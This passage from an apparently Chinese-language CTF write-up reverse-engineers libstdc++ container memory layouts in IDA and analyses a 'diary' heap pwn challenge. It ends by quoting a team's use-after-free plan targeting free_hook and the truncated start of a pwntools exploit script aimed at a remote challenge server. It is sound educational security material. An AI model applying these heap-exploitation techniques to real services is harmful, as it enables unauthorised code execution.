class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br>  _CharT           _M_local_buf[_S_local_capacity + <span class="hljs-number">1</span>];<br>  size_type        _M_allocated_capacity;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>​        而第一行<code>__Alloc_hider</code>里面又有</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">pointer _M_p; <span class="hljs-comment">// The actual data.</span><br></code></pre></div></td></tr></table></figure><p>​        所以对于<code>typedef basic_string&lt;char&gt; string</code>来说就是8+8+16=32字节. C++11特有, 其他版本未看. </p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p><del>也是32字节</del>. 其实是24字节. </p><p>构造函数还是一如既往的套娃清零函数. <code>_Vector_base</code>和<code>_Vector_impl::_Vector_impl</code>之类的函数. 在第三层调用allocator, 其实啥也没干就返回了.</p><p>我算是看明白这个32字节的布局了, 源码里找半天. 在<code>gcc/libstdc++-v3/include/bits/stl_vector.h</code>里前几行就是_Vector_base, 定义了一些基本的内存布局和一堆构造析构(原来struct也能有构造之类的), 然后vector就定义operator之类的有实际作用的库函数. 嗯, 也可以在IDA里直接查看class, 不用追究细节还更快一点. </p><p>其中:</p><ul><li><p><code>_Vector_base::_Vector_impl</code>继承了<code>_Vector_base::_Vector_impl_data</code>, 而data结构体中含有<code>_M_start/finish/end_of_storage</code>三个指针, 并声明了**<code>_Vector_impl _M_impl;</code>** </p></li><li><p>vector class又继承了<code>_Vector_base</code>, 定义了<code>typedef _Vector_base _Base</code> <code>using _Base::_M_impl;</code>, 于是内存就是3*8=24字节, IDA里也是如此, 至于为什么局部变量是32字节, 我也不知道. sizeof也是24, 确实就是这三个. </p></li><li><p>vector的迭代器好像只有一个成员变量, 是指针. 确实如此, </p></li><li><p>遇到了一个<code>*sub_558C(&amp;iter_reverse)</code>操作, 其实是<code>operator*()</code>, 因为vector是序列式内存分布, 所以直接在内部将指针减8. 具体见上面iter. </p></li><li><p>突然发现我好像认不出来vector的erase….又去看反编译了. </p><ul><li><p>在C++11下第一层封装</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(const_iterator __position)</span></span><br><span class="hljs-function">      </span>&#123; <span class="hljs-keyword">return</span> _M_erase(<span class="hljs-built_in">begin</span>() + (__position - <span class="hljs-built_in">cbegin</span>())); &#125;<br></code></pre></div></td></tr></table></figure><p><code>_M_erase</code>第二层封装</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> vector&lt;_Tp, _Alloc&gt;::iterator<br>vector&lt;_Tp, _Alloc&gt;::_M_erase(iterator __position)<br>&#123;<br><span class="hljs-keyword">if</span> (__position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>_GLIBCXX_MOVE3(__position + <span class="hljs-number">1</span>, <span class="hljs-built_in">end</span>(), __position);<br>--<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish;<br>_Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl, <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br><span class="hljs-keyword">return</span> __position;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>问题在于第一层封装看起来很短, 但是由于C++11的新参数类型const iterator导致在函数使用<code>__position</code>为base来构造一个局部iterator, 然后调用<code>opertor-</code>, 局部变量接收begin()返回值, <code>operator+</code>, 最后才是<code>_M_erase()</code>的调用, 显得很长.<br>即使是第二层封装第一眼也没看出来+1的操作, 其实还是封装在了<code>operator+</code>里. 多熟悉下就懂了. 不等于号也是个函数(…)<br>move又是一堆代码, 放弃了解细节. </p></li><li><p>至于为什么<code>operator-</code>里面有个0xAAAAAAAAAAAAAAAB, 牵扯过多, 除非看懂traits和vector所有Member types等等东西. 简单说就是<code>bool divisible_by_3 = number * 0xAAAAAAABu &lt;= 0x55555555u;</code> 还可以用这个乘法代替常数除法. 本质数学题, 不是那块料. </p></li><li><p><b style="font-weight:bold;font-size:x-large">发现一个新问题, 这个怎么没有destroy <code>__position</code>指向的元素?这也能叫做erase? 就只是让它从向量中消失? </b> 真绝了, 为什么看起来这么奇怪, 可能在实际也有用处, 所以不是默认行为. </p></li></ul></li></ul><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>48字节. </p><p>构造函数还是没有什么特别的. 套娃是真谛. </p><p>和map有着一样的构造函数, 插入时也能找到rb_tree_insert. 注意区别.     </p><h4 id="map-1"><a href="#map-1" class="headerlink" title="map"></a>map</h4><p><del>59字节是个什么东西</del>. 其实是48字节. </p><p>map中只有 <code>std::map::_Rep_type _M_t</code>, 其实就是<code> _Rb_tree</code>这个class, 它的内存仅包含 <code>std::_Rb_tree::_Rb_tree_impl _M_impl</code> , 而这个成员的嵌套关系如下:    </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">std</span>::_Rb_tree&lt;...&gt;::_Rb_tree_impl _M_impl <span class="hljs-comment">//即为_Rb_tree</span><br><span class="hljs-number">00000000</span> baseclass_0     <span class="hljs-built_in">std</span>::allocator&lt;...&gt; <span class="hljs-comment">//就占用一字节</span><br><span class="hljs-number">00000001</span>                 db ? ; undefined<br><span class="hljs-number">00000002</span>                 db ? ; undefined<br><span class="hljs-number">00000003</span>                 db ? ; undefined<br><span class="hljs-number">00000004</span>                 db ? ; undefined<br><span class="hljs-number">00000005</span>                 db ? ; undefined<br><span class="hljs-number">00000006</span>                 db ? ; undefined<br><span class="hljs-number">00000007</span>                 db ? ; undefined<span class="hljs-comment">//意义不明的对齐填充</span><br><span class="hljs-number">00000008</span> baseclass_8     <span class="hljs-built_in">std</span>::_Rb_tree_header ?<span class="hljs-comment">//这个结构体内容在下面</span><br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_header       <span class="hljs-built_in">std</span>::_Rb_tree_node_base ? <span class="hljs-comment">//还是在下面</span><br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span><br></code></pre></div></td></tr></table></figure><p>所以实际上为</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span> map_end<br></code></pre></div></td></tr></table></figure><p>啊, 还是查IDA得结构体方便. 源码里真的是找半天. </p><blockquote><p>开头的map class构造函数还错误的将main的rsi rdx当成是该函数的第二三个参数, 没有符号时IDA可能会错误增加变量个数. </p></blockquote><p>构造函数是一堆套娃子函数, 清空下59字节(大概)内存. </p><ul><li><p>然后分析下**operator[]**函数: 注意到map变量的操作符最终会被编译成class成员函数的样子, 第一个参数为this指针, 第二个参数为相应操作数值. 例如<code>operator[]</code>的对应函数表达式为<code>*sub_28D4(m, fuckstr) = 1;</code>即<code>map[&#39;fuck&#39;] = 666</code>. **在这个函数中可以发现<code>_Rb_tree_insert_and_rebalance</code>这个函数, 也能够确定是某个使用黑红树的容器. ** </p><p>sub_28d4返回的是一个<a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_map.h#L488">左值引用</a>, 在C++11以后的版本中使用右值引用参数(又查了半天的右值复习了下, 主要是配合move和forward两个函数好用), 在源码中就是这么几个函数:</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">v5 = <span class="hljs-built_in">sub_2DD0</span>(a1, a2);<span class="hljs-comment">//lower_bound(), a1 = this*, v5 = __i</span><br>v6 = <span class="hljs-built_in">sub_2DF6</span>(a1);<span class="hljs-comment">//end()</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_2E10</span>(&amp;v5, &amp;v6) || (<span class="hljs-built_in">sub_2E32</span>(a1), v2 = <span class="hljs-built_in">sub_2E4E</span>(&amp;v5), <span class="hljs-built_in">sub_2E6C</span>(&amp;v7, a2, v2)) )       <br>&#123;<br>  <span class="hljs-built_in">sub_2E96</span>(v9, a2);<br>  <span class="hljs-built_in">sub_2EBC</span>(&amp;v10, &amp;v5);<br>  v5 = <span class="hljs-built_in">sub_2EDA</span>(a1, v10, &amp;unk_6004, v9, &amp;v8);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_2E4E</span>(&amp;v5) + <span class="hljs-number">32</span>;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">iterator __i = <span class="hljs-built_in">lower_bound</span>(__k);<br><span class="hljs-comment">// __i-&gt;first is greater than or equivalent to __k.</span><br><span class="hljs-keyword">if</span> (__i == <span class="hljs-built_in">end</span>() || <span class="hljs-built_in">key_comp</span>()(__k, (*__i).first))<br>  __i = _M_t._M_emplace_hint_unique(__i, std::piecewise_construct,<br>std::forward_as_tuple(std::<span class="hljs-built_in">move</span>(__k)),<br>std::tuple&lt;&gt;());<br><span class="hljs-keyword">return</span> (*__i).second;<br></code></pre></div></td></tr></table></figure><ul><li>然而没符号的**<code>map::find</code>**真的看不出来什么端倪….</li><li>再看看tree的<strong>iterator</strong>, 它的内存布局很简单, 只有一个<code>_Rb_tree_node_base*</code>指针占用8字节. 在调用<code>map::end()</code>时就可以简单地看出来. </li><li>find函数如果没有找到对应键值对则返回iter_end. </li><li>map的erase中对value的空间进行了destroy, 意味着调用了类(如果是的话)的析构函数. </li></ul><blockquote><p>然后是看了源码后的分析</p></blockquote><ul><li>也没啥, map要实现的操作在rb_tree中都有实现, 所以做一个转接调用即可. </li><li>注意到源码中的rb_tree还继承了一个base然而书中没有, 只有一个node_base. </li><li></li></ul><h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><blockquote><p>足足有80字节. </p></blockquote><p>布局如下: </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x50</span>, align=<span class="hljs-number">0x8</span>, copyof_137)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;/r<br><span class="hljs-number">00000000</span> _M_map          dq ?                    ; offset<br><span class="hljs-number">00000008</span> _M_map_size     dq ?<br><span class="hljs-number">00000010</span> <span class="hljs-number">16</span> _M_start        std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ? <br><span class="hljs-number">00000030</span> <span class="hljs-number">48</span> _M_finish       std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ?<br><span class="hljs-number">00000050</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl ends<br></code></pre></div></td></tr></table></figure><p>其中start finish意思显而易见. 但是注意到一个iterator有0x20字节, 和vector的8字节明显不同. 下面是iterator:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, align=<span class="hljs-number">0x8</span>, copyof_139)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> st fi                                   ; std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> <span class="hljs-number">16</span> <span class="hljs-number">48</span> _M_cur          dq ?                    ; offset<br><span class="hljs-number">00000008</span> <span class="hljs-number">24</span> <span class="hljs-number">56</span> _M_first        dq ?                    ; offset<br><span class="hljs-number">00000010</span> <span class="hljs-number">32</span> <span class="hljs-number">64</span> _M_last         dq ?                    ; offset<br><span class="hljs-number">00000018</span> <span class="hljs-number">40</span> <span class="hljs-number">72</span> _M_node         dq ?                    ; offset<br><span class="hljs-number">00000020</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ends<br></code></pre></div></td></tr></table></figure><p>多了first last node. </p><p>注意指针的位置, cur指向第一个元素或者<strong>最后一个元素之后</strong>. </p><img src="../../image/recent_ctf/image-20230124221604604.png" alt="image-20230124221604604" style="zoom:80%;" /><img src="../../image/recent_ctf/image-20230125112558204.png" alt="image-20230125112558204" style="zoom:80%;" /><ul><li><p>它的迭代器比较直接. 逆向迭代如下, 如果是正向迭代则只要第五行即可. 直接初始化<code>*__x = this-&gt;_M_impl._M_finish</code> </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *__cdecl std::deque&lt;<span class="hljs-keyword">int</span>&gt;::<span class="hljs-built_in">rbegin</span>(std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *retstr, std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>)<br>&#123;<br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&amp;,<span class="hljs-keyword">int</span>*&gt; __x; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;::_Deque_iterator(&amp;__x, &amp;<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br>  std::reverse_iterator&lt;std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(retstr, &amp;__x);<br>  <span class="hljs-keyword">return</span> retstr;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>它的push_back-&gt;move+emplace_back. 注意emplace的参数是std::move的返回值, move实际上啥也没做. push_front非常相似.<br>第一次我还是看到了<code>_M_push_back_aux</code>中的一个报错字符串才发现这个是deque. </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> __fastcall std::deque&lt;<span class="hljs-keyword">int</span>&gt;::emplace_back&lt;<span class="hljs-keyword">int</span>&gt;(std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *__args_0)<br>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v4; <span class="hljs-comment">// r9</span><br>  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// r8</span><br>  <span class="hljs-comment">// +48 == +64</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur == <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_last - <span class="hljs-number">1</span> )<br>  &#123; <span class="hljs-comment">// if space is not enough</span><br>    v5 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2); <br>    std::deque&lt;<span class="hljs-keyword">int</span>&gt;::_M_push_back_aux&lt;<span class="hljs-keyword">int</span>&gt;(<span class="hljs-keyword">this</span>, v5, v6); <br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v3 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2);<br>    std::allocator_traits&lt;std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::construct&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt;(<br>      <span class="hljs-keyword">this</span>,<br>      <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur,<br>      v3,<br>      v4); <span class="hljs-comment">//v4是可变参数列表导致的</span><br>    ++<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>erase: 一个if, 一个else语句还是比较明显的, 要注意有两层wrap, 和vector差不多. 还有一个重载版本是擦除区间.<br>有趣的是它会根据要擦除元素的位置左右元素个数来决定移动左边或者右边, 也就是下面if和else的逻辑.<br>不过有一样的问题, 会对front或者end(根据执行的是if还是else语句)执行<code>destroy()</code> </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> deque&lt;_Tp, _Alloc&gt;::iterator<br>deque&lt;_Tp, _Alloc&gt;::<br>_M_erase(iterator __position)<br>&#123;<br>iterator __next = __position;<br>++__next;<br><span class="hljs-keyword">const</span> difference_type __index = __position - <span class="hljs-built_in">begin</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">static_cast</span>&lt;size_type&gt;(__index) &lt; (<span class="hljs-built_in">size</span>() &gt;&gt; <span class="hljs-number">1</span>))<br>&#123;<br><span class="hljs-keyword">if</span> (__position != <span class="hljs-built_in">begin</span>())<br>_GLIBCXX_MOVE_BACKWARD3(<span class="hljs-built_in">begin</span>(), __position, __next);<br><span class="hljs-built_in">pop_front</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (__next != <span class="hljs-built_in">end</span>())<br>_GLIBCXX_MOVE3(__next, <span class="hljs-built_in">end</span>(), __position);<br><span class="hljs-built_in">pop_back</span>();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">begin</span>() + __index;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>pop_back(): 注意到destroy对于原生类型是没有操作的, 看到啥也没返回的不要惊讶. </p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop_back</span><span class="hljs-params">()</span> _GLIBCXX_NOEXCEPT</span><br><span class="hljs-function"></span>&#123;<br>    __glibcxx_requires_nonempty();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur<br>        != <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_first)<br>    &#123;<br>        --<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>        _Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl,<br>            <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        _M_pop_back_aux();<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="DIARY-BIN"><a href="#DIARY-BIN" class="headerlink" title="DIARY BIN"></a>DIARY BIN</h3><p>回到题目中. </p><ul><li><p>sub_2813是init函数. 向一个全局map添加几个键值对, 但是在源码中看到值是一个枚举类型, 要留意这种可能. </p></li><li><p>遇到了变量重复使用, if语句内外已经不是一个含义了. </p></li><li><p>下面的strtol是错误的, 实际上是<code>stoi</code>, 库函数API如下</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">stoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> string&amp; __str, <span class="hljs-keyword">size_t</span>* __idx = <span class="hljs-number">0</span>, <span class="hljs-keyword">int</span> __base = <span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">//__stoa is helper for all sto* functions</span><br>    <span class="hljs-keyword">return</span> __gnu_cxx::__stoa&lt;<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>&gt;(&amp;std::strtol, <span class="hljs-string">&quot;stoi&quot;</span>, __str.<span class="hljs-built_in">c_str</span>(),<br>                                        __idx, __base); &#125;<br></code></pre></div></td></tr></table></figure></li><li></li></ul><p>分支分析:</p><ul><li>op_add<ul><li><code>add format: add#year#month#day#hour#minutes#second#content</code> </li><li>diary_vector存储日记, 最多32个. 时间限制为2022年以前. 分配0x300的空间, content最多写入0x2F0. </li><li>new出来的content如果前四个字符都是空格则又delete掉. 然后在又一次的init中new出一片content空间, <strong>清零并设置前四字节为空格</strong>. </li></ul></li><li>op_update<ul><li><code>update format: update#idx#content</code> </li><li>memset过程和op_add基本一致. idx判断逻辑是不能大于vector长度. </li></ul></li><li>op_show<ul><li><code>show format: show#idx</code> 没啥特别的</li></ul></li><li>op_delete<ul><li>格式就是delete加上idx. </li></ul></li><li>op_encrypt<ul><li><code>encrypt format: encrypt#idx#offset#lengt</code> </li><li><del>使用<code>strtol()</code>但是返回的数值赋值给了unsigned int类型, 可能溢出. 好吧好几个函数都是这样的</del>.<br>不过offset &lt; content_len, len &gt; content_len, len + offset &gt; content_len. </li><li>用idx对应的diary的datetime在<code>time_cry_map</code>里找到映射的<code>diary_cry_vec</code>, 然后将具有offset length content(<strong>by calloc</strong>)三个field的结构体pushback到<code>diary_cry_vec</code>, 作为原始数据, 再将原区域的数据进行byte xor, 字节序列为程序一开始得到的随机数字节串, 设置encrypted bit in diary struct. </li></ul></li><li>decrypt<ul><li><code>decrypt#idx</code> </li><li>根本没解, 在for循环里面把vector的每一个元素部分都memcpy回去. 这?</li></ul></li></ul><p>这又有什么漏洞?? 居然可以是vector::erase的特性….</p><p>直接wp学习法(到底什么时候才能自己做题啊)</p><h3 id="wp1-Nu1l"><a href="#wp1-Nu1l" class="headerlink" title="wp1 - Nu1l"></a>wp1 - Nu1l</h3><blockquote><p>利⽤UAF构造最后⼀个块同时存在于tcache与unsorted bin中<br>再利⽤enc的calloc写⼊，修改next指针为free_hook</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># s = process(&quot;./diary&quot;)</span><br>s = remote(<span class="hljs-string">&quot;119.13.105.35&quot;</span>,<span class="hljs-string">&quot;10111&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">sec,buf</span>):</span><br>payload = <span class="hljs-string">&quot;add#2022#12#10#0#0#&#123;&#125;#&#123;&#125;&quot;</span>.<span 